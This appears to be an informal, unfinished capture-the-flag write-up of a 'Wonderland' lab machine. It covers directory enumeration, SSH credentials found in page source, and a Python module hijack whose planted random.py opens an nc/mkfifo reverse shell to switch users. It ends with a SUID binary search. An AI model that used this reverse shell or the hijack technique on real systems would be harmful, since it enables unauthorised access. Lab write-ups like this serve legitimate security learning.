# Wonderland

export ip =10.10.176.192

first i put the nmap and gobuster to execute, nmap found port 22 and 80 open and gobuster found just tree directorys in the http page.

/img
/poem
/r 

in img have tree images, a rabbit and the others are a alice opens an door.
in these alice imgs theres is some text at the bottom but i couldn't understand it.

i mean, looks like a soo much diferent letters at the same time.

the main page says "that alice was so much surprised,that for a moment she forgot how to speak good english" but my english and my vocabulary aren't good so this becomes a little bit more harder to me.

the /r directory has a small text that says "Would you tell me, please, which way I ought to go from here?" BRO I DONT KNOW FIND YOURSELF.

so,i tried so much different names in url directory but couldn't have a response, just 404  

after a while i has a big idea and i've put de gobuster to run in the /r directory and he found /a directory

and " "That depends a good deal on where you want to get to," said the Cat." is the content of the /r/a/ directory, this cat is very cool i love him and his smile 

but it doesn't matter now, i put the gobuster to execute again but now in the /r/a/ and he found /b directory, looks like the alfabeth but it isn't in order  

# Content: "I don’t much care where—" said Alice.

and gobuster found other /b directory inside /b directory, how confusing!

# Content: "Then it doesn’t matter which way you go," said the Cat. 

now gobuster found /i 

# Content: "—so long as I get somewhere,"" Alice added as an explanation.

all of these page has a "Keep going" in header so i mean that when i arrive in somewhere this will change

and the gobuster found /t and if you put all of these letter together, the result is:

"/r/a/b/b/i/t"  HAHAHAHAHA

and the header changes ! 

# Content: Open the door and enter wonderland

"Oh, you’re sure to do that," said the Cat, "if you only walk long enough."

Alice felt that this could not be denied, so she tried another question. "What sort of people live about here?"

"In that direction,"" the Cat said, waving its right paw round, "lives a Hatter: and in that direction," waving the other paw, "lives a March Hare. Visit either you like: they’re both mad."

so, if i add hatter or marchhare in the url? nothing happens :)

view source of the page has "alice:How Doth The Little Crocodile Improve His Shining Tail"

i don't know what this mean 

i researched about this and i found some darker things about this history and the creator wtffff

i tried a much words about in the url that crocodile and your shining tail but i couldn't find anything 

ITS A LOGIN ABSDIOLUBASOIUBDPAIUSBDPIUBAWPUBEDAUSBDANWDÌNO 

alice@HowDothTheLittleCrocodileImproveHisShiningTail

its a login to ssh connection!

now i can login in the machine

i know where is the root flag but i don't have permission. 

alice can run /usr/bin/python3.6 idontrememberthename.py as rabbit user

this code, imports random and print a random line from an poem,so what i do is 

$ touch random.py
$ vi random.py

~import os
~
~def choice(a):
~  os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 0.0.0.0 9001>/tmp/f")
~
and i got the rabbit user.

rabbit user can run a binary file with suid permission in your home

$ find / -perm -4000 2>/dev/null
- /home/rabbit/teaParty

i can use it to make a privilege escalation but i dont know how ;D